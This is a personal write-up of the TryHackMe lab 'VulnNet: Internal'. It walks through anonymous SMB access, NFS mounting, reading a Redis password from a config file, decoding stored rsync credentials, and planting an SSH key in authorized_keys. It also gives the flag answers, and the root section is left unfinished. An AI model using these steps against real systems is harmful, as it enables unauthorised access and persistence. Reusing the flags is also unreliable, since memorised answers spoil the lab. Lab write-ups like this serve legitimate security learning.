March 8, 2025, Day 306

<p align="left"> <img width="160px" src="https://github.com/user-attachments/assets/c1ab371a-4641-4eef-bda1-f64199f9ef90"> </p>

<h1>VulNet: Internal</h1>
<p>VulnNet Entertainment learns from its mistakes, and now they have something new for you...</p>

<p align="left"> <img width="800px" src="https://github.com/user-attachments/assets/e04a5b3f-38b5-4add-a08a-198c91295052"> </p>

<br>



<ul style="list-style-type:square">
    <li>Get  &nbsp; <code>Services Flag</code>  &nbsp; practicing<br>
	    <code>nmap</code>,  &nbsp; <code>smbclient</code>,  &nbsp; <code>mget</code>,  &nbsp; <code>cat</code>,  &nbsp; <code>ls</code>, and  &nbsp; <code>cd</code>.</li><br>
    <li>Get  &nbsp; <code>Internal Flag</code>  &nbsp; practicing<br>
	    <code>showmount</code>,  &nbsp; <code>sudo mount -t nfs [IP]: [directory]</code>,  &nbsp; <code>sudo apt-get install redis-tools</code>,  &nbsp; <code>redis-cli -h [IP]</Target_IP> -a [password]</code>, <code>KEYS *</code>,  &nbsp; <code>KEYS "___"</code>,  &nbsp; <code>GET "___"</code>,  &nbsp; <code>tree</code>,  &nbsp; <code>cat [file] | more</code>,  &nbsp; <code>mkdir</code></li><br>
    <li>Get  &nbsp; <code>User Flag</code> practicing<br>
	    <code>rsync --list-only rsync://rsync-connect@[IP]:[Port]/[Path]</code>,  &nbsp; <code>LRANGE authlist [range]</code>,  &nbsp; <code>echo " " | base64 -d</code>,  &nbsp; <code>cat</code>,  &nbsp; <code>ls</code>,  &nbsp; <code>cd</code>,  &nbsp; <code>dir</code>.</li><br>
    <li>Get  &nbsp; <code>Root Flag</code>  &nbsp; practicing<br>
	    </li>
</ul></p>

<br>

<h2>Task 1. VulnNet: Internal</h2>

<p>VulnNet Entertainment is a company that learns from its mistakes. They quickly realized that they can't make a properly secured web application so they gave up on that idea. Instead, they decided to set up internal services for business purposes. As usual, you're tasked to perform a penetration test of their network and report your findings.<br>
. Difficulty: Easy/Medium<br>
. Operating System: Linux<br><br>
This machine was designed to be quite the opposite of the previous machines in this series and it focuses on internal services. It's supposed to show you how you can retrieve interesting information and use it to gain system access. Report your findings by submitting the correct flags.<br>

Note: It might take 3-5 minutes for all the services to boot.<br>

Icon made by Freepik from www.flaticon.com</p>

<h4 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h4>
<br>

<h2>Services Flag</h2>

> 1.1. <em>What is the <code>Services Flag</code>? (services.txt) Hint : It's stored inside one of the available services.</em><br><a id='1.1'></a>
>> <code><strong>THM{0a09d51e488f5fa105d8d866a497440a}</strong></code>

<br>

```bash
:~/VulnNetInternal# echo 'Target_IP vulnet-internal' >> /etc/hosts
```

<br>

<p>Ran <code>nmap</code>, and discovered 13 ports open.<br>
- 22,ssh<br>
- 111,rpcbind<br>
- 139, netbios-ssn  Samba smdb 3.X - 4.X<br>
- 445, netbios-ssn  Samba smbd 4.7.6-Ubuntu<br>
- 873, rsync<br>
- 2049, nfs_acl<br>
- 6379, redis<br>
- 9090, filtered zeus-admin<br>
- 35809, javarmi<br>
- 42219, mountd<br>
- 42601, nlockmgr<br>
- 52497, mountd<br>
- 57289, mountd<br>
<br>

```bash
~/VulnNetInternal# nmap -sC -sV -sS -A -O -p- -T5 vulnet-internal
...
Not shown: 65522 closed ports
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
111/tcp   open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38446/udp6  mountd
|   100005  1,2,3      49481/udp   mountd
|   100005  1,2,3      57289/tcp   mountd
|   100005  1,2,3      58541/tcp6  mountd
|   100021  1,3,4      32872/udp6  nlockmgr
|   100021  1,3,4      38379/tcp6  nlockmgr
|   100021  1,3,4      42601/tcp   nlockmgr
|   100021  1,3,4      51039/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp   open     rsync       (protocol version 31)
2049/tcp  open     nfs_acl     3 (RPC #100227)
6379/tcp  open     redis       Redis key-value store
9090/tcp  filtered zeus-admin
35809/tcp open     java-rmi    Java RMI
42219/tcp open     mountd      1-3 (RPC #100005)
42601/tcp open     nlockmgr    1-4 (RPC #100021)
52497/tcp open     mountd      1-3 (RPC #100005)
57289/tcp open     mountd      1-3 (RPC #100005)
MAC Address: 02:D1:FA:78:C8:91 (Unknown)
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 3.8 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s
|_nbstat: NetBIOS name: VULNNET-INTERNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: vulnnet-internal
|   NetBIOS computer name: VULNNET-INTERNAL\x00
|   Domain name: \x00
|   FQDN: vulnnet-internal
|_  System time: 2025-03-08T18:35:52+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-03-08T17:35:52
|_  start_date: N/A
...
```
<br>

<p>Used <code>smbclient</code> to enumerate <code>Samba</code>.<br>
Used <code>mget</code> to download <code>services.txt</code>, <code>data.txt</code>, and <code>business-req.txt</code>.</p>

```bash
:~/VulnNetInternal# smbclient -N //Target_IP/shares
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb  2 09:20:09 2021
  ..                                  D        0  Tue Feb  2 09:28:11 2021
  temp                                D        0  Sat Feb  6 11:45:10 2021
  data                                D        0  Tue Feb  2 09:27:33 2021

		11309648 blocks of size 1024. 3275808 blocks available
smb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 11:45:10 2021
  ..                                  D        0  Tue Feb  2 09:20:09 2021
  services.txt                        N       38  Sat Feb  6 11:45:09 2021

		11309648 blocks of size 1024. 3275808 blocks available
smb: \temp\> mget services.txt
Get file services.txt? y
getting file \temp\services.txt of size 38 as services.txt (12.4 KiloBytes/sec) (average 12.4 KiloBytes/sec)
smb: \temp\> cd ..
smb: \> ls
  .                                   D        0  Tue Feb  2 09:20:09 2021
  ..                                  D        0  Tue Feb  2 09:28:11 2021
  temp                                D        0  Sat Feb  6 11:45:10 2021
  data                                D        0  Tue Feb  2 09:27:33 2021

		11309648 blocks of size 1024. 3275808 blocks available
smb: \> cd data
smb: \data\> ls
  .                                   D        0  Tue Feb  2 09:27:33 2021
  ..                                  D        0  Tue Feb  2 09:20:09 2021
  data.txt                            N       48  Tue Feb  2 09:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 09:27:33 2021

		11309648 blocks of size 1024. 3275808 blocks available
smb: \data\> mget *
Get file data.txt? y
getting file \data\data.txt of size 48 as data.txt (23.4 KiloBytes/sec) (average 16.8 KiloBytes/sec)
Get file business-req.txt? y
getting file \data\business-req.txt of size 190 as business-req.txt (2.9 KiloBytes/sec) (average 3.9 KiloBytes/sec)
smb: \data\> 
```

<p>Used <code>cat</code> to visualize the content of <code>services.txt</code>.</p>

```bash
:~/VulnNetInternal# cat services.txt
THM{0a09d51e488f5fa105d8d866a497440a}
```

<br>

<p>Used <code>cat</code> to visualize the content of <code>business-req.txt</code>, and for <code>data.txt</code> ... discovered that <code>we\u2019re waiting for the DOCUMENT you agreed to send us</code>.</p>

```bash
:~/VulnNetInternal# cat data.txt
Purge regularly data that is not needed anymore
:~/VulnNetInternal# cat business-req.txt
We just wanted to remind you that we\u2019re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.
:~/VulnNetInternal#
```

<h2>Internal Flag</h2>

> 1.2. <em>What is the <code>Internal Flag</code>? ("internal flag") Hint : It's stored inside a database of one of the services.</em><br><a id='1.2'></a>
>> <code><strong>THM{ff8e518addbbddb74531a724236a8221}</strong></code>

<p>Mounted a remote directory because in <code>nmap</code> we identified that the <code>target</code> has <code>mountd</code> open ports.</p>

<p><code>showmount -e</code></p>

```bash
:~/VulnNetInternal# showmount -e vulnet-internal
Export list for vulnet-internal:
/opt/conf *
:~/VulnNetInternal# 
```

<p>Created a directory <code>mount</code>.</p>

```bash
:~/VulnNetInternal# mkdir mount
```

<p>Mounted our target in the directory created previously</p>

```bash
~/VulnNetInternal# sudo mount -t nfs vulnet-internal: mount
```

<p>Analyzed the hierarchy using <code>tree</code> command.<br>
Discovered <code>redis.conf</code>.</p>

```bash
~/VulnNetInternal# tree mount
```

![image](https://github.com/user-attachments/assets/f85b31cb-3043-45ea-b711-34d98185c2df)


<p>Discovered a password, and configuration parameters.</p>

```bash
~/VulnNetInternal/mount/opt/conf/redis# ls
redis.conf
~/VulnNetInternal/mount/opt/conf/redis# cat redis.conf | more
# Note that in order to read the configuration file, Redis must be started with the file path as first argument:
./redis-server /path/to/redis.conf
### Memory
rename-command FLUSHDB ""
rename-command FLUSHALL ""
## Includes: If instead you are interested in using includes to override configuration options, it is better to use include as the last line.
# include /path/to/local.conf
# include /path/to/other.conf
## Modules: Load modules at startup
# loadmodule /path/to/my_module.so
# loadmodule /path/to/other_module.so
## Network: By default, if no "bind" configuration directive is specified, Redis listens for connections from all the network interfaces available on the server. It is possible to listen to just one or multiple selected interfaces using the "bind" configuration directive, followed by one or more IP addresses.
# bind 192.168.1.100 10.0.0.1
# bind 127.0.0.1 ::1
## Network: IF YOU ARE SURE YOU WANT YOUR INSTANCE TO LISTEN TO ALL THE INTERFACES JUST COMMENT THE FOLLOWING LINE.
bind 127.0.0.1 ::1
## Protected mode: The server only accepts connections from clients connecting from the IPv4 and IPv6 loopback addresses 127.0.0.1 and ::1, and from Unix domain sockets.  By default protected mode is enabled. You should disable it only if you are sure you want clients from other hosts to connect to Redis even if no authentication is configured, nor a specific set of interfaces are explicitly listed using the "bind" directive.
protected-mode yes
## Port
port 6379
## TCP listen( ) backlog
tcp-backlog 511
## Unix socket. Specify the path for the Unix socket that will be used to listen for incoming connections. There is no default, so Redis will not listen on a unix socket when not specified.
# unixsocket /var/run/redis/redis-server.sock
# unixsocketperm 700
##  Close the connection after a client is idle for N seconds (0 to disable)
timeout 0
## TCP keepalive
tcp-keepalive 300
### GENERAL
daemonize yes
...
supervised no
## pid file
pidfile /var/run/redis/redis-server.pid
## Server Verbosity Level
loglevel notice
## Log File Name
logfile /var/log/redis/redis-server.log
## Enable logging to the system logger
# 'syslog-enabled' to yes
## Syslog Identity
# syslog-ident redis
## Syslog Facility: Must be USER or between LOCAL0-LOCAL7.
# syslog-facility local0
## Number of databases
databases 16
...
always-show-logo yes
## SNAPSHOTTING
save 900 1
save 300 10
save 60 10000
...
stop-writes-on-bgsave-error yes
## Compress string objects
rdbcompression yes
## Checksum
rdbchecksum yes
## The filename where to dump the DB
dbfilename dump.rdb
## The working directory. ... Note that you must specify a directory here, not a file name.
dir /var/lib/redis
### REPLICATION
## Master-slave replication
slave-serve-stale-data yes

requirepass "B65Hx562F@ggAZ@F"
...
## Configure a slave instance
slave-read-only yes
...
## Replication SYNC strategy
repl-diskless-sync no
## Configure delay for diskless replication when enabled
repl-diskless-sync-delay 5
## Configure interval that slaves send pings to server
# repl-ping-slave-period 10
## Configure replication timeout
repl-timeout 60
## Configure TCP_NODELAY
# repl-disable-tcp-nodelay no
## Configure replication backlog size
# repl-backlog-size 1mb
...
# repl-backlog-ttl 3600
...
slave-priority 100
...
# min-slaves-to-write 3
# min-slaves-max-lag 10
...
# slave-announce-ip 5.5.5.5
# slave-announce-port 1234
...
### SECURITY
# requirepass foobared
...
## Command renaming.
# rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52
...
# rename-command CONFIG ""
...
### CLIENTS
...
# maxclients 10000
### MEMORY MANAGEMENT
...
# maxmemory <bytes>
## MAXMEORY POLICY
...
# maxmemory-policy noeviction
...
# maxmemory-samples 5
### LAZY FREEING
...
lazyfree-lazy-eviction no
lazyfree-lazy-expire no
lazyfree-lazy-server-del no
slave-lazy-flush no
### APPEND ONLY MODE
...
appendonly no
...
# The name of the append only file (default: "appendonly.aof")
appendfilename "appendonly.aof"
...
# appendfsync always
appendfsync everysec
# appendfsync no
...
no-appendfsync-on-rewrite no
...
auto-aof-rewrite-percentage 100
auto-aof-rewrite-min-size 64mb
...
aof-load-truncated yes
...
aof-use-rdb-preamble no
### LUA SCRIPTING
...
## Set it to 0 or a negative value for unlimited execution without warnings.
lua-time-limit 5000
### REDIS CLUSTER
# cluster-enabled yes
...
# cluster-config-file nodes-6379.conf
...
# cluster-node-timeout 15000
...
## Zero is the only value able to guarantee that when all the partitions heal # the cluster will always be able to continue.
# cluster-slave-validity-factor 10
...
# cluster-migration-barrier 1
...
# cluster-require-full-coverage yes
...
# cluster-slave-no-failover no
### CLUSTER DOCKER/NAT support
...
# * cluster-announce-ip
# * cluster-announce-port
# * cluster-announce-bus-port
...
# Example:
# cluster-announce-ip 10.1.1.5
# cluster-announce-port 6379
# cluster-announce-bus-port 6380
### SLOW LOG
# slowlog-log-slower-than 10000
...
slowlog-max-len 128
### LATENCY MONITOR
latency-monitor-threshold 0
### EVENT MODIFICATION
notify-keyspace-events ""
### ADVANCED CONFIG
hash-max-ziplist-value 64
..
list-max-ziplist-size -2
...
list-compress-depth 0
...
set-max-intset-entries 512
...
zset-max-ziplist-entries 128
zset-max-ziplist-value 64
...
hll-sparse-max-bytes 3000
...
activerehashing yes
...
client-output-buffer-limit normal 0 0 0
client-output-buffer-limit slave 256mb 64mb 60
client-output-buffer-limit pubsub 32mb 8mb 60
...
hz 10
### ACTIVE DEFRAGMENTATION
...
```

<p>Accessed <code>redis</code>, and discovered the second flag.</p>

```bash
:~/VulnNetInternal# sudo apt-get install redis-tools
...
:~/VulnNetInternal# redis-cli -h Target_IP -a 'B65Hx562F@ggAZ@F'
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
Target_IP:6379> KEYS *
1) "marketlist"
2) "int"
3) "internal flag"
4) "tmp"
5) "authlist"
Target_IP:6379> KEYS "internal flag"
1) "internal flag"
Target_IP:6379> GET "internal flag"
"THM{ff8e518addbbddb74531a724236a8221}"
```

<h2>User Flag</h2>

> 1.3. <em>What is the user flag? (user.txt)</em><br><a id='1.3'></a>
>> <code><strong>THM{da7c20696831f253e0afaca8b83c07ab}</strong></code>

<p>Used redis <code>LRANGE</code> command. It is a command that returns the specified elements of the list stores at the key. The offsets start and stop are zero-based indexes, with 0 being the first element of the list (the head of the list), 1 being the next element, and so on.  These offsets can also be negative numbers indicating offsets starting at the end of the list. For example, -1 is the last element of the list, -2 the penultimate, and so on.</p>

```bash
Target_IP:6379> LRANGE authlist 1 10
1) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
2) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
3) "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg=="
Target_IP:6379> 
```

<p>Decode it, discovered location, and credentials.</p>

```bash
~/VulnNetInternal# echo "QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==" | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
:~/VulnNetInternal# 
```

<p>Explored <code>rsync</code>: port 873.</p>

```bash
~/VulnNetInternal#
~/VulnNetInternal# rsync authorized_keys rsync://rsync-connect@Target_IP/files/sys-internal/.ssh/
Password: 
drwxrwxr-x          4,096 2021/02/06 11:43:14 .
...
~/VulnNetInternal# ls
files
:~/VulnNetInternal# cd files
:~/VulnNetInternal/files# dir
sys-internal
:~/VulnNetInternal/files# cd sys-internal
:~/VulnNetInternal/files/sys-internal# dir
Desktop  Documents  Downloads  Music  Pictures	Public	Templates  user.txt  Videos
:~/VulnNetInternal/files/sys-internal# cat user.txt
THM{da7c20696831f253e0afaca8b83c07ab}
:~/VulnNetInternal/files/sys-internal#
...
~/VulnNetInternal# rsync rsync://rsync-connect@Target_IP/files
Password: 
drwxr-xr-x          4,096 2021/02/01 12:51:14 .
drwxr-xr-x          4,096 2021/02/06 12:49:29 sys-internal
:~/VulnNetInternal# rsync rsync://rsync-connect@Target_IP/files/sys-internal/
Password: 
drwxr-xr-x          4,096 2021/02/06 12:49:29 .
-rw-------             61 2021/02/06 12:49:28 .Xauthority
lrwxrwxrwx              9 2021/02/01 13:33:19 .bash_history
-rw-r--r--            220 2021/02/01 12:51:14 .bash_logout
-rw-r--r--          3,771 2021/02/01 12:51:14 .bashrc
-rw-r--r--             26 2021/02/01 12:53:18 .dmrc
-rw-r--r--            807 2021/02/01 12:51:14 .profile
lrwxrwxrwx              9 2021/02/02 14:12:29 .rediscli_history
-rw-r--r--              0 2021/02/01 12:54:03 .sudo_as_admin_successful
-rw-r--r--             14 2018/02/12 19:09:01 .xscreensaver
-rw-------          2,546 2021/02/06 12:49:35 .xsession-errors
-rw-------          2,546 2021/02/06 11:40:13 .xsession-errors.old
-rw-------             38 2021/02/06 11:54:25 user.txt
drwxrwxr-x          4,096 2021/02/02 09:23:00 .cache
drwxrwxr-x          4,096 2021/02/01 12:53:57 .config
drwx------          4,096 2021/02/01 12:53:19 .dbus
drwx------          4,096 2021/02/01 12:53:18 .gnupg
drwxrwxr-x          4,096 2021/02/01 12:53:22 .local
drwx------          4,096 2021/02/01 13:37:15 .mozilla
drwxrwxr-x          4,096 2021/02/06 11:43:14 .ssh
drwx------          4,096 2021/02/02 11:16:16 .thumbnails
drwx------          4,096 2021/02/01 12:53:21 Desktop
drwxr-xr-x          4,096 2021/02/01 12:53:22 Documents
drwxr-xr-x          4,096 2021/02/01 13:46:46 Downloads
drwxr-xr-x          4,096 2021/02/01 12:53:22 Music
drwxr-xr-x          4,096 2021/02/01 12:53:22 Pictures
drwxr-xr-x          4,096 2021/02/01 12:53:22 Public
drwxr-xr-x          4,096 2021/02/01 12:53:22 Templates
drwxr-xr-x          4,096 2021/02/01 12:53:22 Videos
:~/VulnNetInternal# rsync -hv user.pub rsync://rsync-connect@Target_IP/files/sys-internal/.ssh/authorized_keys --inplace
...
```

<br>

> 1.4. <em>What is the root flag? (root.txt)</em><br><a id='1.4'></a>
>> <code><strong>____________________________________</strong></code>

<p>Discovered that we have read, write, and execute permission in <code>sys-internal/.ssh</code></p>


<p>Generated <code>VulnNetInternalRSA</code> and <code>VulnNetInternalRSA.pub</code>.</p>

```bash
:~/VulnNetInternal/files/sys-internal/.ssh# ssh-keygen -f VulnNetInternalRSA
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in VulnNetInternalRSA
Your public key has been saved in VulnNetInternalRSA.pub
The key fingerprint is:
SHA256:[ Redacted ] [ Redacted ]
The key's randomart image is:
+---[RSA 3072]----+
|          . ...==|
|         . +..=.*|
|          * ...+=|
|         + = ..o+|
|        S = . ..E|
|       o O    ..*|
|        * .  o +B|
|       . o  . +.*|
|             .o*o|
+----[SHA256]-----+
```

<p>Created <code>authorized_keys</code>.</p>

```bash
:~/VulnNetInternal/files/sys-internal/.ssh# touch authorized_keys
```

<p>Stored <code>VulnNetInternalRSA.pub</code> in <code>authorized_keys</code>.</p>

```bash
:~/VulnNetInternal/files/sys-internal/.ssh# cat VulnNetInternalRSA.pub > authorized_keys
```

<p>Provided user read, write, and execute permissions.</p> 

```bash
:~/VulnNetInternal/files/sys-internal/.ssh# chmod 700 authorized_keys
```

<p>Used <code>rsync</code> again.</p>

```bash
~/VulnNetInternal/files/sys-internal# rsync -av ~/VulnNetInternal/files/sys-internal/.ssh/authorized_keys rsync://rsync-connect@Target_IP:873/files/sys-internal/.ssh
```

```bash
:~/VulnNetInternal/files/sys-internal# ls -la
total 108
drwxr-xr-x 18 ubuntu ubuntu 4096 Feb  6  2021 .
drwxr-xr-x  3 root   root   4096 Feb  1  2021 ..
lrwxrwxrwx  1 root   root      9 Feb  1  2021 .bash_history -> /dev/null
-rw-r--r--  1 ubuntu ubuntu  220 Feb  1  2021 .bash_logout
-rw-r--r--  1 ubuntu ubuntu 3771 Feb  1  2021 .bashrc
drwxrwxr-x  8 ubuntu ubuntu 4096 Feb  2  2021 .cache
drwxrwxr-x 14 ubuntu ubuntu 4096 Feb  1  2021 .config
drwx------  3 ubuntu ubuntu 4096 Feb  1  2021 .dbus
drwx------  2 ubuntu ubuntu 4096 Feb  1  2021 Desktop
-rw-r--r--  1 ubuntu ubuntu   26 Feb  1  2021 .dmrc
drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Documents
drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Downloads
drwx------  3 ubuntu ubuntu 4096 Feb  1  2021 .gnupg
drwxrwxr-x  3 ubuntu ubuntu 4096 Feb  1  2021 .local
drwx------  5 ubuntu ubuntu 4096 Feb  1  2021 .mozilla
drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Music
drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Pictures
-rw-r--r--  1 ubuntu ubuntu  807 Feb  1  2021 .profile
drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Public
lrwxrwxrwx  1 root   root      9 Feb  2  2021 .rediscli_history -> /dev/null
drwxrwxr-x  2 ubuntu ubuntu 4096 Feb  6  2021 .ssh
-rw-r--r--  1 ubuntu ubuntu    0 Feb  1  2021 .sudo_as_admin_successful
drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Templates
drwx------  4 ubuntu ubuntu 4096 Feb  2  2021 .thumbnails
-rw-------  1 ubuntu ubuntu   38 Feb  6  2021 user.txt
drwxr-xr-x  2 ubuntu ubuntu 4096 Feb  1  2021 Videos
-rw-------  1 ubuntu ubuntu   61 Feb  6  2021 .Xauthority
-rw-r--r--  1 ubuntu ubuntu   14 Feb 12  2018 .xscreensaver
-rw-------  1 ubuntu ubuntu 2546 Feb  6  2021 .xsession-errors
-rw-------  1 ubuntu ubuntu 2546 Feb  6  2021 .xsession-errors.old
:~/VulnNetInternal/files/sys-internal# 
```



<h2> Need to write the last part ...</h2>

<br>
<br>

<h2>My journey on TryHackMe</h2>

```
306 days streak 🎉 ▪ 85,777 points ▪ 608 rooms completed ▪ 59 badges🎖️
Global ranking:    365ᵗʰ all time    ▪    381st monthly
Brazil ranking:      8ᵗʰ all time    ▪      7ᵗʰ monthly
```

<br>

![image](https://github.com/user-attachments/assets/5d25c563-aef9-4fce-8f7d-fe252a65f5a4)


<br>

<p>Global all time ranking: 365ⁿᵈ</p>

https://github.com/user-attachments/assets/1fa772ca-0cab-4e6a-9d75-c77dfa8946e0

<br>

![image](https://github.com/user-attachments/assets/b54c84e5-9d3f-4348-ad92-4718398510d7)


<br>

<p>Brazil all time ranking: 8ᵗʰ</p>

![image](https://github.com/user-attachments/assets/d353760a-c4ba-4df2-86eb-4299401ea215)


<br>

<p>Global monthly ranking: 381st</p>

![image](https://github.com/user-attachments/assets/439ff06c-6edc-4f18-b472-b7e9d370f928)


<br>

<p>Brazil monthly ranking: 7ᵗʰ</p>

![image](https://github.com/user-attachments/assets/9a75ce88-3623-4c27-9e33-9197cc288ce8)


